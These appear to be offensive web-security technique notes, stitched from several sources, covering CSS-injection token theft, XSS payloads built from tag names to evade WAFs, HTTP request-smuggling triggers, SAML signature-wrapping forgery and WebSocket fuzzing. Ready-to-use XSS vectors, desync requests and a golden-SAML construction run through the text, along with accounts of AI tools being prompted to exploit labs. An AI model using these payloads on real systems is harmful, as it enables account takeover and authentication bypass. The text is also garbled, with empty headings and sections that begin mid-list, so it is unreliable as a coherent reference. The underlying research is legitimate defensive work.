CLASS: CSS INJECTION → SECRET/TOKEN EXFILTRATION, escalated from a 12-char brute force to ANY-LENGTH tokens recovered with ONE stylesheet. This is a distinct method built on the recorded §17.228 CSS-injection material: it is the escalation (long secret material → account takeover) that makes the primitive critical, and it needs NO recursive stylesheet imports.
CORE METHOD:
  1. The insight: Gareth's CSS reports WHICH short chunks appear in a link but NOT WHERE. That is enough — a token is a ROUTE THROUGH OVERLAPPING FRAGMENTS. `c2e`, `2e1`, `e16`, `16a` each share two characters with the next, so they stitch left-to-right into `c2e16a`. Model it as a graph: draw `c2e` as an arrow `c2 → 2e`; `2e1` continues `2e → e1`; following the arrows rebuilds the token one character at a time, and the separately-reported start and end tell you where the route must begin and finish.
  2. The catch the script must handle: two chunks can fit on the graph even when they came from DIFFERENT places in the URL, and a chunk that appears twice is reported only ONCE — so the reconstruction script must COUNT EVERY token that fits the reported start/end and the known length, not stop at the first plausible one.
  3. Make the checks cheap. A 3-character chunk confirms a join, but checking every 4-character chunk costs 65,536 rules vs 4,096 for 3-char. Split the possible joins into groups chosen by the join's MIDDLE character: `0`–`d` use the stronger three-character check, `e`/`f` use the cheaper two-character check — every join is still covered but only 14 of 16 groups need 3-char rules.
  4. Proven sizes (12-char hex token): 99%-one-guess = 1.33 MB / 25,088 selectors; 90%-≤5-guesses = 223 KB / 4,128 selectors (14 strong groups + four groups of 4-char checks starting a–e, which lifted it to 99,114/100,000 one-candidate runs). Gareth's original generator needed 257.69 MB for the same 12 characters — roughly 1,150× and 193× smaller.
  5. SMASH THE LIMIT — with Gareth's published byte budget (257,691,933 bytes) check EVERY five-character chunk (1,048,576 selectors) plus a sparse set of six-character checks (beginning a/b/c/d) to prune joins that look possible from the shorter chunks but never appeared together: 4,268,032 selectors, 257,029,661 bytes. That recovered a **210-character token at 99% one-guess** (29,753/30,000 URLs left exactly one candidate) and a **640-character token at 90% ≤5 guesses** (27,158/30,000).
  6. Harness honestly: generate a NEW random token each run AND new values for the other 32 hex characters already in the URL (here the `source` parameter), keeping the URL shape fixed, so the script sees the same extra matches it would in reality and is not over-trained to one token; record each chunk once with no position; run 100,000 URLs per final setup.
  7. SCALE CHUNK SIZE TO THE ALPHABET (this is the transferable trick): the Burp AT skill was given a lab with a HIDDEN 44-character token over upper+lower+digits (62 possible characters) — checking every three-character chunk would need 238,328 rules, too big, so the skill SWITCHED to two-character chunks, bringing the number of chunks to check down to 3,844, and rewrote both the CSS and the stitching script. Labs: `portswigger-labs.net/token-scripts/01-href-token.php` … `07-authenticity-token.php` (mixed alphanumeric) … `10-data-csrf-button.php`; prompt used: "I want you to exploit this CSS injection: https://…/07-authenticity-token.php The injection occurs in a POST param called q".
DETECTION SIGNAL: a CSS-injection sink where the secret is longer than ~12 characters (a session id, a CSRF token, an API key, a password-reset token); a token rendered into an attribute/text node you can select on; the ability to inject enough CSS to enumerate short n-grams (the `[attr^=".."]`/`[attr*=".."]` rule set). CHAIN: CSS injection into a page that renders a long-lived secret (primitive: attacker CSS on the origin) -> leaking the unordered set of overlapping 2-, 3-, 5- or 6-character chunks and reconstructing the full token by overlap-graph search (escalation: the attacker holds the ENTIRE secret, not a 12-char fragment) -> use the token to authenticate/reset ⇒ ACCOUNT TAKEOVER with ONE stylesheet and no recursive fetches, which is what makes the CSS-injection primitive critical rather than medium.

CLASS: XSS / SANITIZER + WAF BYPASS — the TAG NAME itself is the JavaScript payload, using DOM properties that do not uppercase or strip. In-class XSS; the value is a WAF/blocklist-bypass primitive for a sink that echoes an attacker-chosen tag name or attribute.
CORE METHOD:
  1. Tag names must begin with `a-zA-Z`, but many characters are allowed after that, and the browser UPPERCASES the tag name — HOWEVER the DOM property `localName` (found by giving an element an `id` and inspecting it with `console.dir(x)`) holds the tag name in LOWERCASE. That lowercase string is your payload source.
  2. Make the element fire an event: any element can be made focusable with `tabindex` (plus `autofocus`), and `onfocus` can be CHAINED WITH ITSELF. Write a string into the handler via `attributes[0].value`, which is converted into a function and called as a constructor with `new`:
     `<alert(1) onfocus="attributes[0].value=localName,new onfocus" autofocus tabindex=1>` — the article says it "works in every browser" and is "a pretty nice way to bypass a WAF".
  3. UPPERCASE JavaScript also works: `<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus tabindex=1>`.
  4. Transformation fuzzing: alphabetic characters, forward slashes, whitespace and newlines ARE transformed in a tag name; line and paragraph separator characters are NOT (they behave as newlines in JavaScript), giving odd vectors such as `<null alert(1) onfocus="attributes.onfocus.value=localName,new onfocus" autofocus tabindex=1>`.
  5. If `attributes[0].value` is filtered, alternatives that read the same tag-name string: `attributes[0].textContent=localName` and `attributes[0].nodeValue=localName` (still `new onfocus`).
  6. An opening angle bracket can be part of the tag name, letting you combine the tag name with the first attribute into a markup/XSS vector: `<alert<img title=" src onerror=alert(1)> " onfocus=innerHTML=localName+attributes[0].value tabindex=1 autofocus>`.
  7. The `part` attribute converts space-separated values into an ARRAY — extract the `onfocus(event)` portion, overwrite the `event` variable with the payload, replace the `onfocus` variable with the `Function` constructor, and eval the tag name: `<ALERT(1) onfocus="event=localName;part=onfocus,onfocus=Function,eval(part[1])()" tabindex=1 autofocus>`.
  8. Variants (some surfaced by Sol 5.6): use `contenteditable` instead of `tabindex` to make the element focusable (`<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus contenteditable>`); use `getAttributeNode('onfocus').value=localName,onfocus()`; use `setHTMLUnsafe(localName+title)`; and a `classList` version of the `part` vector (`event=localName;classList=onfocus,onfocus=Function,eval(classList[1])()`).

CORE METHOD:

CORE METHOD:
  1. THE PROTOCOL RULER (undisclosed black-box recon technique, published here for the first time): almost every server has a header-length limit, and a front-end TRANSFORMATION changes byte length, so use the back-end's limit as a RULER to measure which header byte sequences get transformed. Send one header value of N `A`s until the status flips (here 64,040 → `200`, 64,041 → `400`); then replace two `A`s with a 2-byte sequence (`c0 8a`) and re-find the limit (64,030) — the 10-byte shift proves the sequence was EXPANDED by 10 bytes (mojibake/Unicode transformation). This unveils value-rewriting of IP-spoofing headers, header dropping/overriding and Unicode transformations that lead to desync. (Param Miner now implements it.) Prompting lesson recorded for reuse: ask a concrete sub-question and rule out a low-value solution, and keep "micro-inspiration" to 1-3 sentences — models anchor hard on any extra context.
  2. THE EVALUATION PRIMITIVE (the transferable core of the method): take a control request that always returns the same response (`GET / HTTP/1.1` → `200 OK`), send a candidate trigger over a SEPARATE connection, then re-send the control and look for ANY change (`405 Method Not Allowed`) — the system has no expectation about what the poisoned response looks like, which is what lets it detect desync classes nobody knows exist. Follow up with a known-format payload to classify the class, e.g. smuggle `GET / HTTP/777` with `X: Y` and look for a third distinct response (`505 HTTP Version Not Supported`) on the victim request.
  3. NOVEL TRIGGERS CONFIRMED LIVE (each a single request to pair with the control): `GET / HTTP/1.0` + `Transfer-Encoding: gzip`; `Upgrade: websocket`; `CONNECT / HTTP/1.1`; `OPTIONS / HTTP/1.0` + `Expect :\t100-continue` (note the space before the colon and the TAB); `POST / HTTP/2` with no content-length; the single-packet attack; `Content-Type: multipart/form-data; boundary=x`; `Content-Type: multipart/byteranges;`; `Transfer_Encoding: chunked` (UNDERSCORE, so it is ignored as a framing header but maybe not by the back-end); `Range: ,`; `OPTIONS *?xyz HTTP/1.1`; an over-long header `A: BBB…{6556}`; `Get / HTTP/1.1` (mixed case verb); duplicated `Content-Length: 1` twice; `POST /HTTP/1.1` with `x x`; `GET / /`; `Early-data: 1`; `DELETE / HTTP/1.1` + `Max-Forwards: 0`. THE BIGGEST WINNER — `HTTP/1.0` + `Transfer-Encoding: gzip` gives a CL.0 desync on many server implementations (found on a US government site; RQP via collaborator scan on an airport exposing internal staff admin panels; underlying flaw traced to F5 Big-IP). SECOND — `Content-Type: multipart/byteranges; boundary=BOUND` used as a plain CL.0 trigger (payload simply placed after `Content-Length: 123`, NOT after the multipart terminator) worked on multiple server implementations and exposed 200+ sites in the target set including an American bank: RFC 2616 §19.2 says `multipart/byteranges` is the one exception that appears in a `206` RESPONSE, and a parser that shares code between requests and responses misapplies the rule to a REQUEST.
  4. THE NOVEL PATTERN — DUAL MATCHING CONTENT-LENGTH: two identical, valid `Content-Length: 28` headers make the server treat the body length as ZERO (CL.0 semantics), giving a desync with no framing disagreement at all: `GET / HTTP/1.1 Host: sso.redacted.com Content-Length: 28 Content-Length: 28` + body `GET /x HTTP/5.1 X: X` → the victim's request gets `505 HTTP Version Not Supported`. This completed an exploit on a "juicy SSO server", and a sibling vector (`Content-Length: 35` + `X: Y` + a leading-space ` Content-Length: 35` on a stylesheet endpoint) leaked a long-lived API key out of a bank's public infrastructure (traced to a Citrix NetScaler misconfiguration).
  5. THE DANGLING-BYTE TECHNIQUE (novel RQP weaponisation that removes the stacked-response race): smuggle a PARTIAL request that is missing exactly one byte (`POST /smuggled HTTP/1.1 Host: example.com Content-Length: 1` with no body byte), so the back-end cannot produce its second response until the VICTIM's request arrives and completes it — the two responses stop racing and the result is deterministic: your trigger returns `403`, the victim's `GET /victim` returns `404`, and the response carrying `Victim-data…` lands in YOUR stream (`GET /stealer`). Extremely effective on every target with a method-agnostic back-end. The stacked-response problem it solves: a back-end that unexpectedly sends two responses makes the front-end over-read the second, notice more data than expected, and RESET — defeating RQP; the only previously known countermeasure was raw request volume.
  6. STATUS-LINE INJECTION (new concept from the autonomous cascade): some servers copy the PROTOCOL STRING from the request line straight into the response status line — `GET / COW<` (no version) → `COW< 200 OK`. Alone it is not exploitable, but it lets you hit otherwise-unreachable front-end response-processing code; on a bank's host, `OPTIONS / COW<S>` produced `COW<S> 400 Bad Request` and triggered a complete BUFFERING BREAKDOWN.
  7. RANGE CACHE POISONING (new concept): some servers answer range requests WITHOUT a `206` status, so a partial response with `200 OK` + `Content-Length: 630` can be stored in a cache. `Range: bytes=5-10, 1-2` returns a `multipart/mixed` body of the requested slices; with a cache in front, `Range: bytes=364-382, 1-2` makes the FRONT-END REASSEMBLE a valid HTML document out of attacker-chosen slices of a real page, or — if the front-end does not reassemble — `GET /x?q=sanitized\x<` with `Range: bytes=5-10` returns the reflected string WITH the unescaped `<`, because the server applied escaping to the whole document while the front-end served only the slice (context-aware escaping collapse).
  8. SHARED-PARSER CONFUSION (the paper's headline concept): servers reuse the same parser code for requests AND responses, so RESPONSE-only processing rules can be triggered from a REQUEST — "the attack surface you can hit isn't limited to request features". The trigger was a request carrying `Content-Type: multipart/byteranges;`; the insight is the generalisation, and it also explains servers processing `Set-Cookie` inside requests. Closest published work is Orange Tsai's Apache "Confusion Attacks" `Location` SSRF chain (partial overlap only).
  9. RESPONSE FORKING (a desync class that does NOT need a length disagreement or even a body): `GET / HTTP/1.1 Host: redacted Content-Length: X Accept-Encoding: identity Content-Type: multipart/byteranges` returned `400 Bad Request` with a FIRST body, then a SECOND complete response (`<!DOCTYPE html><title>XYZ Home</title>`) delivered over HTTP/0.9 (no headers); with `Accept-Encoding: gzip, deflate, br` the second response arrived compressed as a binary blob. CLASS: AUTHENTICATION BYPASS in the Ruby/PHP SAML ecosystem via XML Signature Wrapping (XSW) — parser-level inconsistencies (ATTRIBUTE POLLUTION, REXML NAMESPACE CONFUSION WITHOUT DTDs) plus a new class, VOID CANONICALIZATION (canonicalization erring out and being silently treated as an empty string). CORE METHOD:
  1. DROP THE HARD PRECONDITION: classic XSW needs a legitimately signed SAML Assertion for the target (register through the IdP, MITM, Google dorking) and most SPs accept an assertion only once. Instead, reuse ANY XML document signed with the IdP's private key and make the flawed verifier believe YOUR Assertion is what was signed. Public sources of a valid signature: SAML metadata (rarely signed, but often retrievable signed by appending `?sign=true`), and — the reliable one — the IdP's SIGNED ERROR RESPONSE (a `samlp:AuthnRequest` needs only `ID`, `Version`, `IssueInstant`, so sending `ID="&#x80;"`, `IssueInstant="INVALID"`, `Version="INVALID"` still yields a signed failure response); WS-Federation metadata for major IdPs is nearly always public too.
  2. WHY IT IS FRAGILE: ruby-saml verifies with TWO parsers — REXML extracts `DigestValue`/`SignatureValue` while Nokogiri (libxml2) canonicalises the referenced element, and BOTH find the signature with the permissive XPath `//ds:Signature` (first occurrence ANYWHERE in the document) before REXML checks that the signature's parent is an Assertion. The patch to 1.12.4 only added DTD and well-formedness checks; it left the two-parser dependency intact.
  3. ATTRIBUTE POLLUTION (libxml2 `xmlGetProp` ignores namespaces — the docs say so explicitly): with simple-name collisions such as `<samlp:Response ID="1" samlp:ID="2">` versus `<samlp:Response samlp:ID="2" ID="1">` the value returned depends ONLY ON ATTRIBUTE ORDER, and REXML (independent implementation) picks the opposite one for the same document (`attributes['ID']`, `get_attribute("ID").value`). PHP's `DOMNamedNodeMap::getNamedItem` has the same simple-name-only behaviour. So the signature-verification module can resolve `//*[@ID='id']` to one element while the business logic's `element['ID']` / `getNamedItem('ID')` / `attributes['ID']` reads ANOTHER — placing the signed element and the processed element in different nodes:
     `<samlp:Response ID="attack" samlp:ID="ID"><Signature><Reference URI="#ID"/></Signature><samlp:Extensions><Assertion ID="#ID"/></samlp:Extensions><Assertion ID="evil"/></samlp:Response>`
  4. REXML NAMESPACE CONFUSION WITHOUT DTDs: `xmlns` and the reserved `xml` prefix are treated by REXML as ordinary attributes. Injecting/redefining them, e.g. `<Signature xml:xmlns='http://www.w3.org/2000/09/xmldsig#'/>`, or nesting with `<Parent xmlns='http://www.w3.org/2000/09/xmldsig#'><Child xml:xmlns='#anything'><Signature/></Child></Parent>`, makes REXML's namespace-aware `//ds:Signature` MISS a Signature node that Nokogiri sees (and vice-versa) — i.e. you split the signature-detection logic between the two parsers.
  5. STAY SCHEMA-VALID: ruby-saml ships 12 XSDs; validation still allows extension points, and the two elements that appear BEFORE the Signature in a valid response are `samlp:Extensions` and `samlp:StatusDetail`. Put the REAL enveloped signature (extracted from the IdP-signed document) inside `Extensions`, wrapped in the namespace-confused `Parent/Child`, and leave a FAKE `Signature` inside the `Assertion` — detection then finds and validates the real one while the assert-processing module consumes the attacker's Assertion.
  6. IMPOSSIBLE XSW → VOID CANONICALIZATION: the fake `Signature` left inside the Assertion makes the digest self-reference (the parser removes the Signature before hashing, but yours is inside the hashed element) — unbreakable by hashing tricks. Solve it at the TRANSFORMATION stage: the XML Signature Recommendation warns that "the relative URIs will not be operational in the canonical form", and most implementations do not handle that failure securely. Declare a RELATIVE namespace URI — `<samlp:Response xmlns:ns="1">` — which is still well-formed XML but makes libxml2's canonicalization error out; Nokogiri's canonicalization then simply RETURNS AN EMPTY STRING, so the `DigestValue` is computed over empty input: the SHA-256 of the empty string, `47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=`. Since `SignatureValue` is the signature over the canonicalised `SignedInfo`, an attacker who has ever obtained a signature over an empty string can reuse it — producing a GOLDEN SAML RESPONSE that passes signature validation no matter how the Assertion claims are modified (sample in the project's GitHub `Samples` folder).
  7. ASSEMBLE: extracted enveloped signature inserted into the extension point + reserved `xml`-attribute namespace declaration hiding the Signature from the SAML processing module while keeping it for signature verification + fake `Signature` in the Assertion carrying the empty-string digest + void canonicalization raising the unhandled exception that bypasses the hash check. Real case: a large SaaS (undisclosed) where this forged SAML Response, combined with Gareth Heyes' "Splitting the Email Atom" parser trick, created a new account and bypassed authentication outright.

WRAP THE WEBSOCKET IN HTTP SO AN ORDINARY SCANNER CAN FUZZ IT: WebSocket Turbo Intruder's HTTP Middleware exposes a local endpoint whose `url` parameter is the WS endpoint and whose BODY is the WS message — `POST /proxy?url=https%3A%2F%2F<host>%2Fchat HTTP/1.1` / `Host: 127.0.0.1:9000` / `Content-Length: 16` / body `{"message":"hi"}` — the extension relays it over the WS connection and returns the reply, so Burp Scanner/Intruder can scan a WebSocket ("ideal for finding server-side vulnerabilities like SQL injection, authentication bypass, or command injection").
  2. FILTER THE NOISE: unlike HTTP, one outgoing WS message can produce MANY incoming messages (the article's lab answers one message with three), so lock the table to the responses you care about with an incoming-message decorator, e.g. `@MatchRegex(r'{"user":"Hal Pline"')` on `handle_incoming_message` (or `@MatchRegex(r'{"user":"You"')` for an echo).

Then complete the handshake yourself — create the connection with `upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO","4"))`, queue `'40'` (the Socket.IO connect packet), then send frames such as `connection.queue('42["message","hello"]')`, keeping the session alive with the built-in `@Pong("3")` / `@PingPong("2","3")` decorators. For the HTTP-adapter variant, return the connection after `connection.queue('40')` + `connection.decIn()`.
